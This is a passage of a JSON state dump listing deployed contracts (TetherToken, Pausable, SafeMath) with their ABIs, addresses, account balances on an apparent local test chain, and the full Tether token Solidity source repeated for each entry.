UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857894140000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x59d3631c86BbE35EF041872d502F218A39FBa150",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x59d3631c86BbE35EF041872d502F218A39FBa150": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857894140000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return 